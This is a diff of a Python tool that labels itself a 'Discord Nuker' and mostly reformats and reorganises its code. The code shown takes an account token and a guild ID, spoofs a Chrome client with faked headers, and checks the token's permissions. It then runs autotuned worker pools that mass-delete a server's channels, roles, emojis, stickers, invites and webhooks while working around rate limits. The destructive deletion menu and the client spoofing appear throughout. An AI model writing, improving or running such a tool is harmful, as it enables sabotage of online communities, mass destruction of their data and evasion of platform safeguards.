@@ -12,71 +12,72 @@ from typing import Any, Callable, Deque, Dict, List, Optional, Tuple
 
 import httpx
 
-Reset = "\033[0m"
-Bold = "\033[1m"
-Gray = "\033[90m"
-BrightRed = "\033[91m"
-BrightGreen = "\033[92m"
-BrightYellow = "\033[93m"
-BrightBlue = "\033[94m"
+Reset         = "\033[0m"
+Bold          = "\033[1m"
+Gray          = "\033[90m"
+White         = "\033[37m"
+BrightRed     = "\033[91m"
+BrightGreen   = "\033[92m"
+BrightYellow  = "\033[93m"
+BrightBlue    = "\033[94m"
 BrightMagenta = "\033[95m"
-BrightCyan = "\033[96m"
-Orange = "\033[38;5;208m"
-Purple = "\033[38;5;135m"
-Pink = "\033[38;5;213m"
-Teal = "\033[38;5;51m"
-Lime = "\033[38;5;154m"
+BrightCyan    = "\033[96m"
+Orange        = "\033[38;5;208m"
+Purple        = "\033[38;5;135m"
+Pink          = "\033[38;5;213m"
+Teal          = "\033[38;5;51m"
+Lime          = "\033[38;5;154m"
 
 ApiBase = "https://discord.com/api/v10"
 
-MaxRetries = 5
+MaxRetries     = 5
 InitialWorkers = 24
-MinWorkers = 12
-MaxWorkers = 40
+MinWorkers     = 12
+MaxWorkers     = 40
 
-JitterMin = 0.003
-JitterMax = 0.020
+JitterMin   = 0.003
+JitterMax   = 0.020
 BackoffBase = 0.10
-BackoffMax = 2.5
+BackoffMax  = 2.5
 
-ConnectTimeout = 3.5
-ReadTimeout = 10.0
-WriteTimeout = 10.0
-PoolTimeout = 3.5
-MaxConnections = 120
-MaxKeepalive = 60
+ConnectTimeout  = 3.5
+ReadTimeout     = 10.0
+WriteTimeout    = 10.0
+PoolTimeout     = 3.5
+MaxConnections  = 120
+MaxKeepalive    = 60
 KeepaliveExpiry = 30.0
 
-ProgressInterval = 0.35
-AutotuneInterval = 1.2
+ProgressInterval    = 0.35
+AutotuneInterval    = 1.2
 AutotuneLogCooldown = 8.0
 
 GlobalRateLimitCap = 90.0
-QueueGetTimeout = 1.0
-WorkerStaggerMax = 0.04
+QueueGetTimeout    = 1.0
+WorkerStaggerMax   = 0.04
 
-AutotuneUpStep = 3
-AutotuneDownFactor = 0.75
+AutotuneUpStep             = 3
+AutotuneDownFactor         = 0.75
 AutotuneRateLimitThreshold = 0.25
-AutotuneSuccessThreshold = 15
+AutotuneSuccessThreshold   = 15
 
-PermAdministrator = 1 << 3
-PermManageChannels = 1 << 4
-PermManageGuild = 1 << 5
-PermManageRoles = 1 << 28
-PermManageWebhooks = 1 << 29
+PermAdministrator          = 1 << 3
+PermManageChannels         = 1 << 4
+PermManageGuild            = 1 << 5
+PermManageRoles            = 1 << 28
+PermManageWebhooks         = 1 << 29
 PermManageGuildExpressions = 1 << 30
 
 Stats: Dict[str, Any] = {
-    "Done": 0,
-    "Already": 0,
-    "Failed": 0,
-    "Retries": 0,
+    "Done":       0,
+    "Already":    0,
+    "Failed":     0,
+    "Retries":    0,
     "RateLimits": 0,
-    "StartTime": 0.0,
+    "StartTime":  0.0,
 }
 
-StatsLock: Optional[asyncio.Lock] = None
+StatsLock: Optional[asyncio.Lock]  = None
 StopEvent: Optional[asyncio.Event] = None
 
 
@@ -97,6 +98,49 @@ def SafeClear() -> None:
         os.system("cls" if os.name == "nt" else "clear")
     except Exception:
         pass
+
+
+def Box(Title: str, Message: str, Color: str = BrightCyan) -> None:
+    SafePrint("\r\033[K", End="")
+    SafePrint("")
+    SafePrint(
+        f"{Purple}┌─ {Color}{Bold}{Title}{Reset} "
+        f"{Purple}───────────────────────────────────────────────────┐{Reset}"
+    )
+    for Line in str(Message).split("\n"):
+        if Line:
+            SafePrint(f"{Purple}│{Reset} {Color}{Line}{Reset}")
+    SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
+    SafePrint("")
+
+
+def ErrorBox(Message: str) -> None:
+    Box("Error", Message, BrightRed)
+
+
+def InfoBox(Message: str) -> None:
+    Box("Info", Message, BrightCyan)
+
+
+def WarningBox(Message: str) -> None:
+    Box("Warning", Message, BrightYellow)
+
+
+def FormatProgressBar(Done: int, Total: int, Width: int = 30) -> str:
+    Width = max(0, min(200, Width))
+    if Total <= 0:
+        return f"{Purple}[{' ' * Width}]{Reset}"
+    Done = max(0, min(Done, Total))
+    Percent = SafeDiv(Done, Total, 0)
+    Filled  = max(0, min(Width, int(Width * Percent)))
+    if Percent < 0.33:
+        Color = BrightRed
+    elif Percent < 0.66:
+        Color = Orange
+    else:
+        Color = BrightGreen
+    Bar = f"{Color}{'█' * Filled}{Purple}{'░' * (Width - Filled)}{Reset}"
+    return f"{Purple}[{Reset}{Bar}{Purple}]{Reset}"
 
 
 async def SafeSleep(Seconds: float) -> None:
@@ -177,67 +221,25 @@ def IsMutatingMethod(Method: str) -> bool:
 
 def CheckHttp2Available() -> bool:
     if importlib.util.find_spec("h2") is None:
-        ErrorBox("Missing Dependency: h2\nInstall with: pip install httpx[http2]")
+        ErrorBox("Missing dependency: h2\nInstall it with: pip install httpx[http2]")
         return False
     return True
 
 
-def Box(Title: str, Message: str, Color: str = BrightCyan) -> None:
-    SafePrint("\r\033[K", End="")
-    SafePrint("")
-    SafePrint(
-        f"{Purple}┌─ {Color}{Bold}{Title}{Reset} "
-        f"{Purple}───────────────────────────────────────────────────┐{Reset}"
-    )
-    for Line in str(Message).split("\n"):
-        if Line:
-            SafePrint(f"{Purple}│{Reset} {Color}{Line}{Reset}")
-    SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
-    SafePrint("")
-
-
-def ErrorBox(Message: str) -> None:
-    Box("Error", Message, BrightRed)
-
-
-def InfoBox(Message: str) -> None:
-    Box("Info", Message, BrightCyan)
-
-
-def WarningBox(Message: str) -> None:
-    Box("Warning", Message, BrightYellow)
-
-
-def FormatProgressBar(Done: int, Total: int, Width: int = 30) -> str:
-    Width = max(0, min(200, Width))
-    if Total <= 0:
-        return f"{Purple}[{' ' * Width}]{Reset}"
-    Done = max(0, min(Done, Total))
-    Percent = SafeDiv(Done, Total, 0)
-    Filled = max(0, min(Width, int(Width * Percent)))
-    if Percent < 0.33:
-        Color = BrightRed
-    elif Percent < 0.66:
-        Color = Orange
-    else:
-        Color = BrightGreen
-    Bar = f"{Color}{'█' * Filled}{Purple}{'░' * (Width - Filled)}{Reset}"
-    return f"{Purple}[{Reset}{Bar}{Purple}]{Reset}"
-
-
 class GuildNuker:
     def __init__(self, Token: str, GuildId: str) -> None:
-        self.Token = Token
+        self.Token   = Token
         self.GuildId = GuildId
+
         self.Headers: Dict[str, str] = {
-            "Authorization": Token,
-            "Content-Type": "application/json",
+            "Authorization":    Token,
+            "Content-Type":     "application/json",
             "User-Agent": (
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                 "AppleWebKit/537.36 (KHTML, like Gecko) "
                 "Chrome/134.0.0.0 Safari/537.36"
             ),
-            "Accept": "*/*",
+            "Accept":          "*/*",
             "Accept-Language": "en-US,en;q=0.9",
             "X-Super-Properties": (
                 "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xv"
@@ -248,25 +250,26 @@ class GuildNuker:
                 "wiY2xpZW50X2J1aWxkX251bWJlciI6MzAwMDAwfQ=="
             ),
         }
+
         self.Client: Optional[httpx.AsyncClient] = None
-        self.Queue: Optional[asyncio.Queue[Tuple[str, str, Optional[Dict[str, Any]]]]] = None
+        self.Queue:  Optional[asyncio.Queue[Tuple[str, str, Optional[Dict[str, Any]]]]] = None
 
         self.ResourceCache: Dict[str, Optional[List[Any]]] = {
             "Channels": None,
-            "Roles": None,
+            "Roles":    None,
         }
 
-        self.User: Optional[Dict[str, Any]] = None
-        self.Guild: Optional[Dict[str, Any]] = None
-        self.Permissions: int = 0
-        self.IsOwner: bool = False
-        self.IsAdmin: bool = False
+        self.User:        Optional[Dict[str, Any]] = None
+        self.Guild:       Optional[Dict[str, Any]] = None
+        self.Permissions: int  = 0
+        self.IsOwner:     bool = False
+        self.IsAdmin:     bool = False
 
-        self.GuildOwnerId: Optional[str] = None
-        self.UserHighestRolePosition: int = -1
-        self.UserRoleIds: set = set()
-        self.RolePositions: Dict[str, int] = {}
-        self.RoleCache: Dict[str, Dict[str, Any]] = {}
+        self.GuildOwnerId:            Optional[str]             = None
+        self.UserHighestRolePosition: int                       = -1
+        self.UserRoleIds:             set                       = set()
+        self.RolePositions:           Dict[str, int]            = {}
+        self.RoleCache:               Dict[str, Dict[str, Any]] = {}
 
     async def __aenter__(self) -> "GuildNuker":
         self.Queue = asyncio.Queue()
@@ -330,8 +333,8 @@ class GuildNuker:
                 return False
 
             if SafeGet(self.Guild, "owner_id") == MyId:
-                self.IsOwner = True
-                self.IsAdmin = True
+                self.IsOwner     = True
+                self.IsAdmin     = True
                 self.Permissions = 0xFFFFFFFFFFFFFFFF
                 return True
 
@@ -350,16 +353,16 @@ class GuildNuker:
 
             if MemberResponse.status_code != 200:
                 self.Permissions = 0
-                self.IsAdmin = False
+                self.IsAdmin     = False
                 return True
 
             Member = SafeJson(MemberResponse)
             if not isinstance(Member, dict):
                 self.Permissions = 0
-                self.IsAdmin = False
+                self.IsAdmin     = False
                 return True
 
-            MyRoles = set(SafeGet(Member, "roles", []) or [])
+            MyRoles     = set(SafeGet(Member, "roles", []) or [])
             Accumulated = 0
             for Role in AllRoles:
                 if not isinstance(Role, dict):
@@ -371,7 +374,7 @@ class GuildNuker:
                     Accumulated |= SafeInt(SafeGet(Role, "permissions", 0), 0)
 
             self.Permissions = Accumulated
-            self.IsAdmin = bool(Accumulated & PermAdministrator)
+            self.IsAdmin     = bool(Accumulated & PermAdministrator)
             return True
         except Exception:
             return False
@@ -401,7 +404,7 @@ class GuildNuker:
                 if not RoleId:
                     continue
                 self.RolePositions[RoleId] = SafeInt(SafeGet(Role, "position", 0), 0)
-                self.RoleCache[RoleId] = Role
+                self.RoleCache[RoleId]     = Role
 
             MemberResponse = await self.Request(
                 "GET", f"{ApiBase}/guilds/{self.GuildId}/members/{MyId}"
@@ -430,32 +433,32 @@ class GuildNuker:
         )
 
         if not self.Token:
-            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Token: Required{Reset}")
+            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Token: required{Reset}")
             SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
             return False
 
         if not await self.ValidateToken():
-            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Token: Invalid{Reset}")
+            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Token: invalid{Reset}")
             SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
             return False
 
-        Username = SafeGet(self.User, "username", "Unknown")
+        Username      = SafeGet(self.User, "username",      "Unknown")
         Discriminator = SafeGet(self.User, "discriminator", "0")
-        DisplayName = f"{Username}#{Discriminator}" if Discriminator != "0" else Username
+        DisplayName   = f"{Username}#{Discriminator}" if Discriminator != "0" else Username
         SafePrint(f"{Purple}│{Reset} {BrightGreen}✔ Token: {Teal}{Bold}{DisplayName}{Reset}")
 
         if not self.GuildId:
-            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: Required{Reset}")
+            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: required{Reset}")
             SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
             return False
 
         if not self.GuildId.isdigit():
-            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: Invalid ID format{Reset}")
+            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: invalid ID format{Reset}")
             SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
             return False
 
         if not await self.ValidateGuild():
-            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: Not found{Reset}")
+            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: not found{Reset}")
             SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
             return False
 
@@ -465,12 +468,12 @@ class GuildNuker:
         )
 
         if not await self.ValidatePermissions():
-            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Permissions: Could not fetch{Reset}")
+            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Permissions: could not fetch{Reset}")
             SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
             return False
 
         if not await self.LoadHierarchy():
-            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Hierarchy: Could not load{Reset}")
+            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Hierarchy: could not load{Reset}")
             SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
             return False
 
@@ -482,23 +485,23 @@ class GuildNuker:
             SafePrint(f"{Purple}│{Reset} {BrightYellow}⚠ Permissions: {Teal}{Bold}Limited{Reset}")
 
         PermissionChecks = [
-            ("Manage Channels", PermManageChannels),
-            ("Manage Roles", PermManageRoles),
-            ("Manage Guild", PermManageGuild),
-            ("Manage Webhooks", PermManageWebhooks),
+            ("Manage Channels",    PermManageChannels),
+            ("Manage Roles",       PermManageRoles),
+            ("Manage Guild",       PermManageGuild),
+            ("Manage Webhooks",    PermManageWebhooks),
             ("Manage Expressions", PermManageGuildExpressions),
         ]
-        Granted = [Name for Name, Flag in PermissionChecks if self.HasPerm(Flag)]
-        Missing = [Name for Name, Flag in PermissionChecks if not self.HasPerm(Flag)]
+        GrantedPerms = [Name for Name, Flag in PermissionChecks if self.HasPerm(Flag)]
+        MissingPerms = [Name for Name, Flag in PermissionChecks if not self.HasPerm(Flag)]
 
         SafePrint(
             f"{Purple}│{Reset} {BrightGreen}✔ Granted:{Reset} "
-            f"{Teal}{', '.join(Granted) or 'None'}{Reset}"
+            f"{Teal}{', '.join(GrantedPerms) or 'None'}{Reset}"
         )
-        if Missing:
+        if MissingPerms:
             SafePrint(
                 f"{Purple}│{Reset} {BrightYellow}⚠ Missing:{Reset} "
-                f"{Gray}{', '.join(Missing)}{Reset}"
+                f"{Gray}{', '.join(MissingPerms)}{Reset}"
             )
 
         HierarchyLabel = "Owner" if self.IsOwner else f"Position {self.UserHighestRolePosition}"
@@ -552,9 +555,9 @@ class GuildNuker:
                     return Response
 
                 if Status == 429:
-                    Body = SafeJson(Response) or {}
-                    RetryAfter = SafeFloat(Body.get("retry_after", 1.0), 1.0)
-                    Scope = Response.headers.get("X-RateLimit-Scope", "")
+                    Body        = SafeJson(Response) or {}
+                    RetryAfter  = SafeFloat(Body.get("retry_after", 1.0), 1.0)
+                    Scope       = Response.headers.get("X-RateLimit-Scope", "")
                     try:
                         HeaderRetry = Response.headers.get("Retry-After")
                         if HeaderRetry is not None:
@@ -564,7 +567,7 @@ class GuildNuker:
                     IsGlobal = bool(Body.get("global", False)) or Scope == "global"
                     async with StatsLock:
                         Stats["RateLimits"] += 1
-                        Stats["Retries"] += 1
+                        Stats["Retries"]    += 1
                     SleepDuration = RetryAfter + SafeRandomUniform(JitterMin, JitterMax)
                     if IsGlobal:
                         WarningBox(f"Global rate limit — sleeping {SleepDuration:.2f}s")
@@ -651,10 +654,10 @@ class GuildNuker:
 
 class WorkerPool:
     def __init__(self, Nuker: GuildNuker) -> None:
-        self.Nuker = Nuker
+        self.Nuker          = Nuker
         self.CurrentWorkers = InitialWorkers
-        self.Tasks: Deque[asyncio.Task[None]] = deque()
-        self.PoolLock = asyncio.Lock()
+        self.Tasks:         Deque[asyncio.Task[None]] = deque()
+        self.PoolLock       = asyncio.Lock()
         self.LastAutotuneLog: float = 0.0
 
     async def Worker(self, Stagger: float = 0.0) -> None:
@@ -698,7 +701,7 @@ class WorkerPool:
             self.Tasks.append(asyncio.create_task(self.Worker(Stagger=Stagger)))
 
     async def Autotune(self) -> None:
-        LastDone = 0
+        LastDone      = 0
         LastRateLimit = 0
         while True:
             if StopEvent is None or StopEvent.is_set():
@@ -710,19 +713,17 @@ class WorkerPool:
 
             Now = time.time()
             async with StatsLock:
-                DoneDelta = Stats["Done"] - LastDone
+                DoneDelta      = Stats["Done"]       - LastDone
                 RateLimitDelta = Stats["RateLimits"] - LastRateLimit
-                LastDone = Stats["Done"]
-                LastRateLimit = Stats["RateLimits"]
+                LastDone       = Stats["Done"]
+                LastRateLimit  = Stats["RateLimits"]
 
             LogMessage: Optional[str] = None
             async with self.PoolLock:
                 self.Tasks = deque(Task for Task in self.Tasks if not Task.done())
 
-                if (
-                    RateLimitDelta > DoneDelta * AutotuneRateLimitThreshold
-                    and self.CurrentWorkers > MinWorkers
-                ):
+                RateLimitPressure = RateLimitDelta > DoneDelta * AutotuneRateLimitThreshold
+                if RateLimitPressure and self.CurrentWorkers > MinWorkers:
                     NewCount = max(MinWorkers, int(self.CurrentWorkers * AutotuneDownFactor))
                     if NewCount < self.CurrentWorkers:
                         Excess = len(self.Tasks) - NewCount
@@ -732,7 +733,7 @@ class WorkerPool:
                                 Task.cancel()
                             except Exception:
                                 pass
-                        OldCount = self.CurrentWorkers
+                        OldCount            = self.CurrentWorkers
                         self.CurrentWorkers = NewCount
                         if Now - self.LastAutotuneLog >= AutotuneLogCooldown:
                             self.LastAutotuneLog = Now
@@ -744,7 +745,7 @@ class WorkerPool:
                     and self.CurrentWorkers < MaxWorkers
                 ):
                     NewCount = min(MaxWorkers, self.CurrentWorkers + AutotuneUpStep)
-                    ToSpawn = NewCount - len(self.Tasks)
+                    ToSpawn  = NewCount - len(self.Tasks)
                     for _ in range(max(0, ToSpawn)):
                         self.Tasks.append(
                             asyncio.create_task(
@@ -753,7 +754,7 @@ class WorkerPool:
                                 )
                             )
                         )
-                    OldCount = self.CurrentWorkers
+                    OldCount            = self.CurrentWorkers
                     self.CurrentWorkers = NewCount
                     if Now - self.LastAutotuneLog >= AutotuneLogCooldown:
                         self.LastAutotuneLog = Now
@@ -777,7 +778,7 @@ class WorkerPool:
 
 async def ProgressReporter(Total: int) -> None:
     LastSettled = 0
-    LastTime = time.time()
+    LastTime    = time.time()
     while True:
         if StopEvent is None or StopEvent.is_set():
             return
@@ -788,23 +789,23 @@ async def ProgressReporter(Total: int) -> None:
 
         Now = time.time()
         async with StatsLock:
-            Done = Stats["Done"]
-            Already = Stats["Already"]
-            Failed = Stats["Failed"]
-            Retries = Stats["Retries"]
+            Done       = Stats["Done"]
+            Already    = Stats["Already"]
+            Failed     = Stats["Failed"]
+            Retries    = Stats["Retries"]
             RateLimits = Stats["RateLimits"]
 
-        Settled = Done + Already + Failed
-        Delta = max(0, Settled - LastSettled)
+        Settled   = Done + Already + Failed
+        Delta     = max(0, Settled - LastSettled)
         DeltaTime = max(0.0, Now - LastTime)
-        Rate = SafeDiv(Delta, DeltaTime, 0)
+        Rate      = SafeDiv(Delta, DeltaTime, 0)
         LastSettled = Settled
-        LastTime = Now
+        LastTime    = Now
 
-        Bar = FormatProgressBar(Settled, Total)
-        Percent = max(0.0, min(100.0, SafeDiv(Settled, Total, 0) * 100))
+        Bar       = FormatProgressBar(Settled, Total)
+        Percent   = max(0.0, min(100.0, SafeDiv(Settled, Total, 0) * 100))
         Remaining = max(0, Total - Settled)
-        Eta = SafeDiv(Remaining, Rate, 0)
+        Eta       = SafeDiv(Remaining, Rate, 0)
 
         Line = (
             f"{Bar} {Bold}{Teal}{Percent:5.1f}%{Reset} "
@@ -832,7 +833,7 @@ async def DeleteChannels(Nuker: GuildNuker) -> int:
         return 0
 
     Categories: List[Any] = []
-    Others: List[Any] = []
+    Others:     List[Any] = []
     for Channel in Channels:
         (Categories if SafeGet(Channel, "type") == 4 else Others).append(Channel)
 
@@ -868,7 +869,7 @@ async def DeleteRoles(Nuker: GuildNuker) -> int:
         ErrorBox("No deletable roles found")
         return 0
 
-    Count = 0
+    Count   = 0
     Skipped = 0
     for RoleId in EligibleRoles:
         Ok, _ = Nuker.CanManageRole(RoleId)
@@ -977,12 +978,12 @@ async def DeleteWebhooks(Nuker: GuildNuker) -> int:
 
 Actions: Dict[str, Tuple[str, Optional[Callable]]] = {
     "1": ("Delete Channels & Categories", DeleteChannels),
-    "2": ("Delete Roles", DeleteRoles),
-    "3": ("Delete Emojis", DeleteEmojis),
-    "4": ("Delete Stickers", DeleteStickers),
-    "5": ("Delete Invites", DeleteInvites),
-    "6": ("Delete Webhooks", DeleteWebhooks),
-    "7": ("Run Everything", None),
+    "2": ("Delete Roles",                 DeleteRoles),
+    "3": ("Delete Emojis",                DeleteEmojis),
+    "4": ("Delete Stickers",              DeleteStickers),
+    "5": ("Delete Invites",               DeleteInvites),
+    "6": ("Delete Webhooks",              DeleteWebhooks),
+    "7": ("Run Everything",               None),
 }
 
 
@@ -1000,10 +1001,10 @@ async def RunAction(Nuker: GuildNuker, Choice: str) -> int:
 def PrintActionMenu() -> None:
     SafePrint("")
     SafePrint(
-        f"{Purple}┌─ {BrightMagenta}{Bold}Mini Flay - Discord Nuker{Reset} "
-        f"{Purple}────────────────────────────────────┐{Reset}"
+        f"{Purple}┌─ {BrightMagenta}{Bold}Discord Nuker{Reset} "
+        f"{Purple}────────────────────────────────────────────────┐{Reset}"
     )
-    SafePrint(f"{Purple}│{Reset} {Teal}Available Actions{Reset}")
+    SafePrint(f"{Purple}│{Reset} {Teal}Available actions{Reset}")
     SafePrint(f"{Purple}├──────────────────────────────────────────────────────────┤{Reset}")
     for Key in sorted(Actions.keys(), key=int):
         Name, _ = Actions[Key]
@@ -1025,25 +1026,23 @@ async def Main() -> None:
     StopEvent = asyncio.Event()
     Stats.update(
         {
-            "Done": 0,
-            "Already": 0,
-            "Failed": 0,
-            "Retries": 0,
+            "Done":       0,
+            "Already":    0,
+            "Failed":     0,
+            "Retries":    0,
             "RateLimits": 0,
-            "StartTime": 0.0,
+            "StartTime":  0.0,
         }
     )
 
     SafeClear()
     SafePrint("")
     SafePrint(
-        f"{Purple}┌─ {BrightMagenta}{Bold}Mini Flay - Discord Nuker{Reset} "
-        f"{Purple}────────────────────────────────────┐{Reset}"
+        f"{Purple}┌─ {BrightMagenta}{Bold}Configuration{Reset} "
+        f"{Purple}────────────────────────────────────────────┐{Reset}"
     )
-    SafePrint(f"{Purple}│{Reset} {Teal}Configuration{Reset}")
-    SafePrint(f"{Purple}├──────────────────────────────────────────────────────────┤{Reset}")
-    Token = SafeGetpass(f"{Purple}│{Reset} {Teal}Token{Reset}  {Purple}➜{Reset} ")
-    GuildId = SafeInput(f"{Purple}│{Reset} {Teal}Guild{Reset}  {Purple}➜{Reset} ")
+    Token   = SafeGetpass(f"{Purple}│{Reset} {Teal}Token{Reset}  {Purple}➜{Reset} ")
+    GuildId = SafeInput(  f"{Purple}│{Reset} {Teal}Guild{Reset}  {Purple}➜{Reset} ")
     SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
 
     async with GuildNuker(Token, GuildId) as Nuker:
@@ -1069,7 +1068,7 @@ async def Main() -> None:
         SafePrint(f"{Purple}│{Reset} Total operations queued: {Lime}{Bold}{Total}{Reset}")
         SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
 
-        Pool = WorkerPool(Nuker)
+        Pool         = WorkerPool(Nuker)
         await Pool.Start()
         ReporterTask = asyncio.create_task(ProgressReporter(Total))
         AutotuneTask = asyncio.create_task(Pool.Autotune())
@@ -1085,11 +1084,11 @@ async def Main() -> None:
             SafePrint("")
 
         SafePrint("")
-        Elapsed = time.time() - Stats["StartTime"]
-        Done = Stats["Done"]
-        Already = Stats["Already"]
-        Failed = Stats["Failed"]
-        Retries = Stats["Retries"]
+        Elapsed    = time.time() - Stats["StartTime"]
+        Done       = Stats["Done"]
+        Already    = Stats["Already"]
+        Failed     = Stats["Failed"]
+        Retries    = Stats["Retries"]
         RateLimits = Stats["RateLimits"]
 
         SafePrint(
